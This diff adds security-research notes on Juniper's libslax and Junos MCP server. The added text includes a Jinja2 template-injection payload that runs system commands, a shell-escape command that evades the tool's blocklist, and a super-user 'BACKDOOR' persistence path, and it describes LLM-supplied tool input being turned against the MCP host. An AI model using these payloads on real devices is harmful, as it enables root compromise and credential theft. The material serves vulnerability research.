@@ -274,6 +274,144 @@ This is a **vendor-documented log suppression parameter** added in Junos OS Rele
 
 ---
 
+---
+
+## Source RE — libslax Confirmations
+
+Cloned: `github.com/Juniper/libslax` (depth=1, 2026-08-30)
+
+### `slaxExtEvaluate` — libslax/slaxext.c:2852-2884
+
+```c
+str = xmlXPathPopString(ctxt);
+// SLAX-to-XPath translation (syntactic only, no value sanitization)
+sexpr = slaxSlaxToXpath("slax:evaluate", 1, (const char *) str, &errors);
+// Direct eval — no sandbox, no expression restrictions
+ret = xmlXPathEval((const xmlChar *) sexpr, ctxt->context);
+```
+
+`slaxSlaxToXpath` converts SLAX syntax to XPath. It does NOT sanitize or restrict
+what the expression can access. `xmlXPathEval()` has full document tree access.
+If `str` comes from NETCONF input, Chain 3 is confirmed at source level.
+
+### `ext_os` — extensions/os/ext_os.c:1339-1384
+
+OS extension functions available from any SLAX script running as root in mgd:
+
+| Function | Signature | Impact |
+|----------|-----------|--------|
+| `os:mkdir` | `(path)` | Create arbitrary directories |
+| `os:stat` | `(file-spec)` | Stat any file — filesystem enumeration |
+| `os:remove` | `(filespec, ...)` | Delete arbitrary files |
+| `os:chmod` | `(permissions, filespec, ...)` | Change permissions on any file |
+| `os:chown` | `(ownership, file-spec, ...)` | Change ownership |
+| `os:user-info` | `()` | Current process user info |
+| `os:exit-code` | `(number)` | Set process exit code |
+
+All run in mgd context = root. `os:remove` + `os:chmod` = file-based privilege
+escalation primitives from any injectable SLAX script.
+
+---
+
+## Junos MCP Server — `github.com/Juniper/junos-mcp-server`
+
+Official Juniper-published MCP server for LLM-to-router interaction. FastMCP
+framework, PyEZ backend. 9 tools. Analyzed 2026-08-30.
+
+### CRITICAL: Jinja2 SSTI → RCE on MCP Host
+
+**File:** `jmcp.py:1352-1358`
+
+```python
+env = Environment(
+    trim_blocks=True,
+    lstrip_blocks=True,
+    autoescape=False,          # no HTML escaping
+    undefined=StrictUndefined,
+)
+rendered_config = env.from_string(template_content).render(variables)
+```
+
+`template_content` is supplied directly by the MCP client (LLM). No sandbox.
+Standard `Environment()`, not `SandboxedEnvironment`. Exploitable before
+`apply_config` check — render-only mode is sufficient.
+
+**PoC (no router required):**
+```
+tool: render_and_apply_j2_template
+template_content: "{{ ''.__class__.__mro__[2].__subclasses__()[128].__init__.__globals__['system']('id') }}"
+vars_content: "x: 1"
+apply_config: false
+```
+
+**Impact:** RCE on the host running the MCP server. If the server is co-located
+with device credentials in `devices.json`, this becomes full device compromise
+with no NETCONF/SSH authentication needed.
+
+### CRITICAL: `execute_junos_command` shell bypass
+
+**File:** `block.cmd` — 5 blocked patterns:
+```
+request system reboot
+request system halt
+request system power-cycle
+request system power-off
+request system zeroize
+```
+
+NOT blocked: `request system shell`, `file show /etc/master.passwd`,
+`request routing-engine login`, PFE commands, any `show` command.
+
+**PoC:**
+```json
+{"router_name": "r1", "command": "request system shell command \"id\""}
+```
+
+Root shell on FreeBSD Junos device.
+
+### CRITICAL: `execute_junos_pfe_command` — no blocklist
+
+`_run_junos_pfe_command` calls `junos_device.rpc.request_pfe_execute(target, command)`
+with no blocklist check. PFE commands execute below the OS on the packet forwarding
+ASIC. Can dump FIB, modify forwarding tables, access ASIC memory.
+
+### HIGH: `get_junos_config` — full config disclosure
+
+Hardcoded command: `show configuration | display inheritance no-comments | display set | no-more`
+
+Returns complete device configuration including plaintext password hashes to any
+authenticated MCP client. No access scoping.
+
+### HIGH: `block.cfg` incomplete — user persistence
+
+Blocked: `set system root-authentication`, `set system login user ([^ ]+) authentication`
+
+NOT blocked: `set system login user BACKDOOR class super-user` (adds user without auth =
+SSH key injection path if user subsequently sets their key via unblocked command path).
+
+### Token storage
+
+Default token file: `.tokens` in server working directory. Format documented in
+README. If world-readable (Docker default volumes), provides MCP API access.
+
+---
+
+## libxml2.so.3 in Junos EVO — CVE Status
+
+Library: `libxml2.so.3` from Junos EVO 23.4R2.14 ISO initrd, not stripped.
+Embedded version: `20909` = libxml2 **2.9.9**.
+
+| CVE | Fixed in upstream | Status in 2.9.9 |
+|-----|------------------|-----------------|
+| CVE-2021-3541 (billion laughs) | 2.9.11 | PATCHED — Juniper backported. `xmlParserEntityCheck` at 0xef6b0: `cmp r13, 0x98967f` (10MB) + ×10 document size limit |
+| CVE-2022-23308 (XInclude UAF) | 2.9.14 | LIKELY UNPATCHED — version is pre-fix; `xmlXIncludeDoProcess` at 0x7b550 exists, NULL guard coverage needs deeper trace |
+
+`xmlXIncludeDoProcess` is 300+ instructions. Full guard coverage analysis pending.
+`xmlLoadExtDtdDefaultValue` exported — external DTD loading compiled in.
+12 custom `register_*` DOM API functions (Juniper-specific node registry).
+
+---
+
 ## Binary RE Targets (automation layer)
 
 The functions above are implemented in:
